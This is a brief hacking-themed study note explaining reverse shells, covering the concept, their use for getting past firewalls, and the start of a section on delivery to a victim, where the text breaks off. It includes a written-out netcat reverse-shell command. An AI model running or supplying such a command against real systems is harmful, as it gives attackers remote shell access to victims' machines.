
#security #hacking


# 1. Definition

Reversed shell is type of connection in which remote computer connect to our computer and when connected, the remote computer open a shell session.

E.g:

- We are listening at computer A - ip 1.1.1.1 port 11111
- Remote computer B - ip 2.2.2.2 connect to us.
- When connection is established, computer B open a shell session (e.g: cmd, bash, zsh, ...)

==> Now, computer A has access to that shell session on computer B and can execute shell command.

# 2. Why?

Normal shell session happen like following:

- Computer A: @ ip 1.1.1.1 send command to a remote server request for connection. E.g: ssh, tcp, nc, ...
- Computer B: is remote server @ ip 2.2.2.2, receive command from computer B
- Computer B accept connection and open a shell sesison

==> Now computer A can execute shell command on Computer B.

If computer B is inside a private network without dedicated public IP or computer B is behind firewall ==> Computer A can not initiated connection to Computer B. However, connection initiated by Computer B is more likely to pass firewall and/or connect to Computer A (which has public IP and no firewall).

# 3. Delivery method

Reversed shell command (like `nc -e /bin/bash 1.1.1.1 80`) can be delivered to victim 